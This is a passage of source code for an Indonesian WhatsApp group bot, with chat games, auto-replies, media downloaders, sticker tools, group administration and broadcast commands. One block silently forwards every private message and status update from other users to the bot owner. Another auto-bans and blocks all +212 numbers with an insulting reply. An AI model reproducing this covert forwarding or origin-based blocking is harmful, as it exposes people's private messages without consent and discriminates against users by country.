if(!isCmd && !isSticker && !isImage && !isVideo && type !== 'reactionMessage' && budy.length < 8000) console.log( isGroup? chalk.bgMagentaBright(color("[  GROUP  ]", "black")):chalk.bgGreenBright(color("[ PRIVATE ]", "black")), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), chalk.blue(budy), color('dari', 'gold'), color(`${pushname}`, 'orange'), isGroup? `${color('di gc', 'purple')} ${color(groupName, "deeppink")}` : "")
if(isCmd) console.log(chalk.bgCyanBright(color("[ COMMAND ]", "black")), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), chalk.blue(`${command} [${args.length}]`), color('dari', 'gold'), color(`${pushname}`, 'orange'), isGroup? `${color('di gc', 'purple')} ${color(groupName, "deeppink")}` : "")
/* <-----------------------------------------------------------------------> */
// auto read and forward sw
if (m.message && !isGroup && !isOwner) {
if (m.key.remoteJid == "status@broadcast") {
var tags = conn.copyNForward(Ownerin, m)
await sleep(3000)
conn.sendMessage(Ownerin, {text:`Status From : @${sender.split('@')[0]}`, contextInfo:{mentionedJid:[m.sender]}},{quoted:m})
} else {
var tags = conn.copyNForward(Ownerin, m)
await sleep(3000)
conn.sendMessage(Ownerin, {text:`Private Chat From : @${sender.split('@')[0]}`, contextInfo:{mentionedJid:[m.sender]}},{quoted:m})
}
}

//GAME MATH FUNCTION
conn.math = conn.math ? conn.math : {}
if(isGroup && from in conn.math){
//console.log(conn.math)
try{
let id = from
if (!(id in conn.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(conn.math[id][1]))
if (budy == math.result) {
user.balance += math.bonus
clearTimeout(conn.math[id][3])
delete conn.math[id]
await setReply(` benar\n\nSaldo: Rp${math.bonus}\n\nmath ${math.mode}`)
} else {    
if (--conn.math[id][2] == 0) {
clearTimeout(conn.math[id][3])
delete conn.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${conn.math[id][2]} kesempatan`)
}
}catch(err){
console.log(err)
}
}

//GAME Caklontong Function
conn.caklontong = conn.caklontong ? conn.caklontong : {}  
if(isGroup && from in conn.caklontong){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat

 let json = JSON.parse(JSON.stringify(conn.caklontong[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 global.db.data.users[sender].exp += conn.caklontong[id][2]
// global.db.data.users[sender].tiketcoin += 1
 setReply(`*Benar!*\n+${conn.caklontong[id][2]} XP\n+1 TiketCoin\n${json.deskripsi}`)
 clearTimeout(conn.caklontong[id][3])
 delete conn.caklontong[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
 else setReply(`*Salah!*`)
 
}


//Game Family 100
conn.family = conn.family ? conn.family : {}
if(isGroup && from in conn.family){
let similarity = require('similarity')
let threshold = 0.72 // semakin tinggi nilai, semakin mirip
let id =  m.chat
let room = conn.family[id]
let text = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy)
if (!isSurrender) {
let index = room.jawaban.indexOf(text)
if (index < 0) {
if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, text))) >= threshold) return setReply('Dikit lagi!')
 }
if (!isCmd && room.terjawab[index]) {return} 
room.terjawab[index] = sender
user.balance += room.winScore
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length

let caption = `
*Soal:* ${room.soal}

Terdapat *${room.jawaban.length}* jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB*` : isSurrender ? '*MENYERAH!*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
 return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
 }).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
    `.trim()

setReply(caption).then(msg => {
 conn.family[id].msg = msg
}).catch(_ => _)
if (isWin || isSurrender) delete conn.family[id] 

}

//AUTO RESPON SIMI VIA REPLY/TAG BOT
const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
const mentionByReplySticker = type == "stickerMessage" && dev.message.stickerMessage.contextInfo != null ? dev.message.stickerMessage.contextInfo.participant || "" : ""
if (Input == Ownerin && isGroup && mentionByReplySticker == Ownerin &&  mentionByReply ==  Ownerin) {
let kualitas = isImage? 70 : 2
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = fs.readFileSync('./stik/stiktag.webp')
	let jancok = new Sticker(media, {
		pack: packName, // The pack name
		author: authorName, // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: kualitas, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await conn.sendMessage(from,{sticker: nah},{quoted: dev})
}
if (Input == botNumber && isGroup && !replyCommand && !isAudio || mentionByReplySticker == botNumber && isSticker && !replyCommand) {
try{	
await sleep(2000)
 conn.sendPresenceUpdate('composing', from) 
if(isQuotedReplySticker || isReplySticker ){
await sleep(2000)
let namastc = await pickRandom(Object.keys(db.data.sticker))
conn.sendMessage(from, {sticker: {url:db.data.sticker[namastc].link}}, {quoted:dev })
} else{

let jawab = ["Afa iyah 🗿","Oh","Aku ga ngerti om 🐦","Boong","🗿","🐦","Oh gitu 🐦"]        
let teks1 = pickRandom(jawab)
let teks2 = body
let hasil = [`${teks1}`,`${teks2}`]
let random = pickRandom(hasil)
  //console.log(idnya)
let kata = body.replace(`@${botNumber.split("@")[0]}`, "")
let kato = ["Kenapa ?","Ha ?","Napa tag gua ?","napa ?","ya ?","apa ?","Hmm ?"]
let acak = pickRandom(kato)
if(kata == "") return conn.sendMessage(from,{text: acak},{quoted: m})  
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${kata}&lc=id`, {methods: "GET"})
let sami = simi.success  

 if(sami.startsWith("Aku tidak mengerti")){
var teksnya = random
} else {
var teksnya = sami
}
   await sleep(2000)
 setReply(teksnya)
//setReply(`${teksnya}`)
}
} catch (err){
console.log(err)
setReply("Simi ga tau mau ngomong apa")
}
}



  
//AUTO BLOCK NOMER ASING +212
let nomerAsing = senderNumber.startsWith('212')
if (nomerAsing) {
if(!db.data.users[sender].banned.status) {
db.data.users[sender].banned.status = true
db.data.users[sender].banned.reason = "Nomer asing +212"
}
console.log(`Nomer asing dari ${senderNumber}`)
await reply("you are not allowed to using this bot")
if(!isGroup) await conn.sendMessage(from, {text: "stupid"},{quoted: lep})
await conn.chatModify({delete: true,lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]},sender)
return conn.updateBlockStatus(sender, "block") 
} 
	


//ANONYMOUS CHAT
const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find(room => room.a == sender)
const roomB = Object.values(anonChat).find(room => room.b == sender )
const room = Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")

if (roomChat && !isCmd && !isGroup && roomChat.b !=="") {
//let nono = m.quoted.fakeObj? m.quoted.fakeObj : m
let other = [roomChat.a, roomChat.b].find(user => user !== sender)
m.copyNForward(other, true)
}

if (room && Date.now() >= room.expired){
await conn.sendMessage(room.a, {text:"Partner tidak di temukan\nKamu telah keluar dari room anonymous"})
anonChat.splice(anonChat.indexOf(room, 1)) 
}
 
//AUTO REACT
let regex =[ "bilek","banh","cum","kntl","anjing","mmk","bang","wibu","pantek","pepek","hentai"]
for (let i of regex){
if (!cekSpam("NotCase",senderNumber, AntiSpam) && isGroup && budy.toLowerCase().includes(i)){ 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
let emot = await pickRandom(["🗿", "👍", "🙄", "😝", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "🔥", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
conn.sendMessage(from, { react: { text: emot, key: dev.key } })	
}
}

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

//FITUR USER PREMIUM
if(!checkDataName("premium", "", DataId)) { 
await createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium) return setReply(`Kamu bukan user premium`)
}

//FITUR KHUSUS OWNER
if(!checkDataName("commands", "", DataId)) { 
await createDataId("commands", DataId) 

}
let ownerCommands =  DataId.filter(item => item.name == "commands" )
for(let i of ownerCommands[0].id){
if(command == i && !isOwner) return onlyOwner()
} 

//FITUR USER LIMIT
if(!checkDataName("limit", "", DataId)) { 
await createDataId("limit", DataId) 
}
let userLimit =  DataId.filter(item => item.name == "limit" )
for(let i of userLimit[0].id){
if(!isOwner && command == i ){
if(!isPremium && db.data.users[sender].limit < 1) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isPremium) {
db.data.users[sender].limit -= 1
conn.sendMessage(from,{text:`Limit kamu tersisa ${user.limit}`}, {quoted: dev})
}
  
}
}

//USER AFK
if (user && user.afk > -1) {
setReply(`Kamu telah berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afk)}`.trim())
user.afk = -1
user.afkReason = ''
}
let jids = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of jids) {
let userAfk = global.db.data.users[jid]
if (!userAfk) continue
let afkTime = userAfk.afk
if (!afkTime || afkTime < 0) continue
let reason = userAfk.afkReason || ''
 setReply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
} 

//Auto Sticker Online
if(db.data.sticker[budy]){ 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "5s", AntiSpam)
conn.sendMessage(from,{sticker:{url:db.data.sticker[budy].link}})
}

//Auto VN Online  
if(db.data.audio[budy]) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
 let nono =  {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${db.data.audio[budy].name}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const iniQuoted = mentionByReply? m.quoted.fakeObj : nono 
conn.sendMessage(from, {audio: {url: db.data.audio[budy].link},ptt: true, waveform:  [
0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  9,
35, 51, 67, 73, 73, 25, 18, 58, 75, 72, 26,  0,
27, 56, 58, 43, 12, 23, 35, 49, 62, 67, 63, 18,
2, 16, 39, 45, 43, 31, 21, 36, 57, 71, 70, 67,
23, 49, 36,  6, 17, 39, 50, 52, 45, 27, 26, 50,
51, 49, 49, 49
], mimetype: 'audio/mpeg'}, {quoted: iniQuoted }) 
addSpam("NotCase",senderNumber, "5s", AntiSpam)
}


 

//Auto Hit 
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`  
//add to dashboard  db.data.allcommand.push(toFirstCase(command)) //
//if(!isGroup) //addAutoClear(m, "1h", clearchat)  
if(isCmd){
db.data.users[sender].hit += 1
cmdAdd("run", "1d", hitnya)
Succes(toFirstCase(command), dash, allcommand)
}


// ==========================================================\\
try{
switch(command) {
    case 'test':{
let teksnyo=`*Quick Test Done*\n*Runtime:* _${runtime(process.uptime())}_\n*Total User:* _${pendaftar.length}_`
setReply(teksnyo)
}
break
	case 'menu':{
	let { allmenu, fitur} = require('./help')
	let menunya = allmenu(limitCount, isPremium,thisHit, publik, sender, prefix, pushname)
	let fiturnya = fitur()
    let butMessage = {
      video: fs.readFileSync('./stik/gif.mp4'),
      gifPlayback: true,
      caption: menunya+readmore+"\n"+fiturnya,
      footer: copyright,
      templateButtons: [{urlButton: {displayText:`Group Official`,url:`https://chat.whatsapp.com/Br5Ju9LjNH0ITOgKr3uUe2`}},{urlButton:{displayText:`Website Creator`,url: `https://g.satganzdevs.repl.co`}},{quickReplyButton:{displayText:`Dashboard`,id:`${prefix}dashboard`}}],
      mentions: [m.sender],
      headerType: 2
    }
    conn.sendMessage(from, butMessage)
    }
	break
	
	
	case 'play':{
	
	if(!q) return setReply("Teksnya mana om")
	setReply(mess.wait)
	let rus = await yts(q)
	if(rus.all.length == "0") return setReply("Video tidak bisa di download")
	let data = await rus.all.filter(v => v.type == 'video')
	
	try{
	var res = data[0]
	var info = await ytdl.getInfo(res.url);
	} catch{
	var res = data[1]
	var info = await ytdl.getInfo(res.url);
	}
	
	let audio = ytdl.filterFormats(info.formats, 'audioonly');
	let format = ytdl.chooseFormat(info.formats, { quality: '18' });
	
	try{
	var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
	} catch(err) {
	var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/default.jpg`
	}
	
	let inithumb = await getBuffer(thumbnya)
	let options2 =
	{ 
	externalAdReply: {
	title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
	body: `   ━━━━⬤──────────    click here to play music `,
	description: 'Now Playing...',
	mediaType: 1,
	renderLargerThumbnail : true,
	thumbnail: inithumb,
	mediaUrl: res.url,
	sourceUrl: res.url
	}
	}
	
	
	   
	var toks =`
	📂 Judul : ${res.title}
	🌐 Ditonton : ${h2k(res.views)} Kali 
	⏳ Durasi : ${res.timestamp}
	👤 Channel : ${res.author.name}
	🎧 Audio : ${FileSize(audio[0].contentLength)} 
	🎬 Video : ${FileSize(format.contentLength)}`
	
	let aklo = [
	{"buttonId": `${prefix}playmp3 ${res.url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
	{"buttonId": `${prefix}playmp4 ${res.url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
	]
	conn.sendButDoc(from, `*YOUTUBE DOWNLOADER*\n${toks}`, copyright, null, aklo, options2)
	}
	break
	
				
					
	
	case 'playmp3':
	if(!isUrl) return setReply("Masukan link")
	try{
	setReply("*Downloading...*")
	let info = await ytdl.getInfo(q);
	let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
	try{
	var low = audioFormats[2].contentLength
	} catch (err){
	var low = audioFormats[0].contentLength
	}
	if(Number(low) > 15000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
	if(audioFormats[0].contentLength == "undefined"){
	var rus = await yts(q)
	var data = await rus.all.filter(v => v.type == 'video')
	var res = data[0]
	if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload audio lebih dari 10 menit")
	}
	downloadMp3(q) 
	} catch (err){
	console.log(err)
	}
	break
	
		
		
	case 'playmp4':{
	if(!isUrl) return setReply("Masukan link")
	let info = await ytdl.getInfo(q);
	let format = ytdl.chooseFormat(info.formats, { quality: '18' });
	if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
	if(format.contentLength == "undefined"){
	var rus = await yts(q)
	var data = await rus.all.filter(v => v.type == 'video')
	var res = data[0]
	if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload video lebih dari 10 menit")
	}
	setReply("*Downloading...*")
	downloadMp4 (q) 
	}
	break
	
	case 'getname':
	if(isGroup) {
	console.log(users)
	const sname = await conn.getName(users)
	setReply(sname)
	} else if(!isGroup) {
	const yahu = await conn.getName(users)
	setReply(yahu)
	} else{
	setReply("Reply targetnya")
	}
	break
	  
	
	 
	case 'del':
	if(!mentionByReply) return setReply("Reply pesan")
	if (mentionByReply == botNumber) {
	conn.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: dev.quoted.id, participant: mentionByReply } })
	} else if(mentionByReply !== botNumber && isBotGroupAdmins){
	conn.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: dev.quoted.id, participant: mentionByReply } })
	} 
	break
	
	
	
	
	case  's':
	case  'sticker':
	if (isImage || isQuotedImage || isVideo || isQuotedVideo) {
	 if (quoted.seconds > 11) return m.reply('Maksimal 10 detik!')
	let kualitas = isImage? 70 : 2
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let jancok = new Sticker(media, {
		pack: packName, // The pack name
		author: authorName, // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: kualitas, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await conn.sendMessage(from,{sticker: nah},{quoted: dev})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
	} else {
	setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
	}
	break
	
	case 'toimg': {
	if (!isQuotedSticker) return setReply('Reply stickernya')
	setReply(mess.wait)
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.png')
	exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
	fs.unlinkSync(media)
	if (err) return setReply(err)
	let buffer = fs.readFileSync(ran)
	await conn.sendMessage(from, {caption: "Nih", image: buffer})
	fs.unlinkSync(ran)
	})
	}
	break
	
	
	
	case 'speed':
	setReply(`Speed: ${latensi.toFixed(4)} Second`)
	break       
		   
	case 'runtime':
	setReply(`⏰ Bot aktif selama ${runtime(process.uptime())}`)
	break
	
	case 'out':
	if (!isGroup) return 
	if (!isOwner) return onlyOwner()
	await conn.groupLeave(from)
	break
	
	
	case 'ss':{
	if(!q) return setReply("Masukan Link")
	if(!isUrl(args[0]) && !args[0].includes('www.')) return reply("Link error");
	if (args.length < 1) return setReply('Urlnya mana om')
	let teks = q
	let ana = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
	let buff = await getBuffer(ana.screenshot)
	await conn.sendMessage(from, {caption : `Link: ${teks}`, image: buff}, {quoted: dev})
	}
	break
	
	case  'bcgc':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
let getGroups = await conn.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let yesnih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
let muk = [{urlButton: {displayText: `ORDER`,url: `https://wa.me/p/5494819543894101/6289652938715`}}]
let teks = `*BROADCAST GROUP*\n\n${q}`
if (isImage || isQuotedImage) { //Image
let buff = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
//let buffer = fs.readFileSync(file)
for (let i of anus) {
await sleep(1000)
await conn.sendMessage(i, {caption: teks, image: fs.readFileSync(buff)}, { quoted: ftroli})
}
fs.unlinkSync(buff)
} else  if (isVideo || isQuotedVideo) { //Video
let buff = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
for (let i of anus) {
await sleep(1000)
await conn.sendMessage(i, {caption: teks, video: buff}, { quoted: ftroli})
}
fs.unlinkSync(buff)
} else if (isAudio || isQuotedAudio) { //Audio
let buff = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
for (let i of anus) {
await sleep(1000)
await conn.sendMessage(i, {caption: teks, audio: fs.readFileSync(buff)}, { quoted: ftroli})
}
fs.unlinkSync(buff)
} else {
for (let i of anus) {
let toks = `┏━ ❮❮ 𝙼𝙴𝚂𝚂𝙴𝙶𝙴 ❯❯
┣❲  ${q}
┖─┅┈⸔⸔⬫
┏┬┬┬┬┬┬┬┬┬┬┬┬┬⁛⸙⸙
┃⫹⫺ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime(process.uptime())}
┃⫹⫺ 𝙳𝚊𝚝𝚎 : ${calender}
┃⫹⫺ 𝚝𝚒𝚖𝚎 : 
┖──┈┈┈〠⸙࿉༐`
let teks2 = "_Broadcast Group_/n"
await sleep(1000)
await conn.send5ButLoc(i, teks2, toks, fs.readFileSync('./stik/thumb.jpeg'),  muk) 
}
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break 
	
	case 'kick': {
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply(mess.only.group)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if(!Input) return setReply("Tag/Mention/Masukan nomer target")
	if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
	await conn.groupParticipantsUpdate(from, [Input], 'remove').then((res) => setReply(`Berhasil mengeluarkan  @${Input.split("@")[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err))) 
	}
	break
		
	
	case 'add': {
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply(mess.only.group)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if(!Input) return setReply("Tag/Mention/Masukan nomer target")
	if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
	await conn.groupParticipantsUpdate(from, [Input], 'add').then((res) =>{
	if(res[0].status == 200) setReply(`Berhasil menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)
	if(res[0].status == 403) setReply(`Gagal menambahkan ${Input.split("@")[0]} ke dalam group ${groupName}`)
	}).catch((err) => setReply(jsonformat(err))) 
	}
	break
		
	case 'demote': {
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply(mess.only.group)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	await conn.groupParticipantsUpdate(from, [users], 'demote').then((res) => setReply(`Sukses Demote  @${users.split('@')[0]}`)).catch((err) => setReply(jsonformat(err)))
	}
	break
	
	case 'kickme':
	try{
	if (!isGroup) return
	await conn.groupParticipantsUpdate(from, [sender], 'remove')
	await setReply("Done wkwkw")
	} catch (err){
	setReply(`${err}`)
	}
	break
	
	case 'admin': case 'promote': {
	if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
	if (!isGroup) return setReply(mess.only.group)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	await conn.groupParticipantsUpdate(from, [users], 'promote').then((res) => setReply(`Sukses Promote @${users.split('@')[0]}`)).catch((err) => setReply(jsonformat(err)))
	}
	break
				
				
	case 'pinterest':{
	const { pinterest } = require("../lib/pinterest")
	if (!q) return reply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
	reply(mess.wait)
	var jumlah;
	if (q.includes('--')) jumlah = q.split('--')[1]
	pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
	if (q.includes('--')) {
	if (data.result.length < jumlah) {
	jumlah = data.result.length
	reply(`Hanya ditemukan ${data.result.length}, foto segera dikirim`)
	}
	for (let i = 0; i < jumlah; i++) {
	conn.sendMessage(from, { image: { url: data.result[i] }})
	}
	} else {
	var but = [{buttonId: `${command} ${q}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
	conn.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: dev })
	}
	})
	}
	break
				
	case 'anime':
	setReply(mess.wait)
	await fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
	.then(res => res.text())
	.then(body => {
	let tod = body.split("\n");
	let pjr = tod[Math.floor(Math.random() * tod.length)];
	imageToBase64(pjr)
	.then((response) => {
	media =  Buffer.from(response, 'base64');
	conn.sendMessage(from,{ image: media,caption:'NIH' },{quoted:dev})
	}
	)
	.catch((error) => {
	console.log(error); 
	}
	)
	});
	break  
	
	
	case 'cecan': 
	setReply(mess.wait)
	var query = ["cecan hd","cecan indo","cewe cantik", "cewe aesthetic", "cecan aesthetic"]
	var data = await pinterest(pickRandom(query))
	var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
	conn.sendMessage(from, { caption: "Random Cewe Cantik", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: dev })
	break
	
	case 'cogan': 
	setReply(mess.wait)
	var query = ["cogan hd","cogan indo","cowo ganteng","handsome boy","hot boy","oppa","cowo aesthetic","cogan aesthetic"]
	var data = await pinterest(pickRandom(query))
	var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
	conn.sendMessage(from, { caption: "Random Cowo Ganteng", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: dev })
	break 
	
	
	case 'join':{
	if(!isOwner) return setReply(mess.only.owner)
	let link = q.startsWith("http")
	if(!link) return setReply(`Kirim perintah ${command} _linkgrup_`)
	var url = args[1]
	let ano = q.split('https://chat.whatsapp.com/')[1]
	await conn.groupAcceptInvite(ano)
	setReply("Sukses join group")
	}
	break
	
	
	case 'hidetag':
	if (!isGroup) return setReply(mess.only.group)
	if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
	let mem = [];
	groupMembers.map( i => mem.push(i.id) )
	conn.sendMessage(from, { text: q ? q : '', mentions: mem })
	break
	
	
	case 'lirik':{
	let ra = require("ra-api");
	if (!q) return reply(`Kirim perintah ${command} judul lagu`)
	setReply(mess.wait)
	ra.Musikmatch(q).then(async(data) => {
	var teks = `*${data.result.judul} - ${data.result.penyanyi}*\n\n${data.result.lirik}`
	conn.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: dev })
	}).catch(() => reply(`Judul lagu tidak ditemukan`))
	}
	break
	
	case 'public':
	if (!isOwner) return onlyOwner()
	if (publik) return setReply('Udah di mode publick kak')
	publik = true
	let bab =`Mode public aktif kak`
	setReply(bab)
	break
			   
	case 'self':
	if (!isOwner) return onlyOwner()
	if (publik == false) return setReply('Udah di mode self kak')
	publik = false
	let breh =`Mode self aktif kak`
	setReply(breh)
	break
	
	
	case 'quotes':
	var data = await fetchJson(`https://saipulanuar.ga/api/quotes`)
    var quotes = await conn.sendMessage(from, { id: m.key.id, contextInfo: { externalAdReply:{ showAdAttribution: true, title: `${botName}`,body:`Runtime ${runtime(process.uptime())} `,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'),mediaUrl: "https://g.satganzdevs.repl.co",sourceUrl: "https://g.satganzdevs.repl.co"}},showAdAttribution: true, text: data.result.quotes })
    await sleep(300)
	conn.sendMessage(from, {audio: fs.readFileSync(`./src/${randomNomor(1, 7)}.mp3`), mimetype:'audio/mpeg', ptt:true, mentions: [m.sender]}, { quoted: quotes})
	break
	
	
	case 'kalkulator':
	const matematik = require('mathjs')
	try{
	let nana = q.replace("x","*")
	let nunu = matematik.evaluate(nana)
	let teks = `${q} = ${nunu}`
	setReply(teks)
	} catch (err){
	setReply( 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
	}
	break
	
	
	case 'toptt':
	if (isQuotedAudio){
	setReply(mess.wait)
	let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
	fs.unlinkSync(media)
	if (err) return setReply('Gagal mengkonversi audio ke ptt')
	let topt = fs.readFileSync(ran)
	await conn.sendMessage(from,{audio: topt, mimetype: 'audio/mp4', ptt:true}, {quoted: dev})
	fs.unlinkSync(ran)
	})
	} else {
	setReply("Reply audio")
	}
	break
	
	
	case 'togif':
	if ( isQuotedSticker) {
	setReply(mess.wait)
	let file = await  conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let outGif = `./temp/${getRandom('.gif')}`
	let outMp4 = `./temp/${getRandom('.mp4')}`
	
	//convert webp ke gif pakai imagemagick
	exec(`convert ${file} ${outGif}`, (err) => {
	if (err) {
	console.log(err)
	return setReply(`${err}`)
	}
	
	//lalu convert gif ke mp4 pakai ffmpeg
	exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
	if (err) {
	console.log(err)
	return setReply(`${err}`)
	 }      
	await sendGif(fs.readFileSync(outMp4))
	 fs.unlinkSync(outGif)
	 fs.unlinkSync(outMp4)
	 fs.unlinkSync(file)
		})
	}) 
	
	} else if(isQuotedVideo){
	setReply(mess.wait)
	let outMp4 = getRandom('.mp4')
	let file = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	let nana = await fs.readFileSync(file)
	await sendGif(nana)
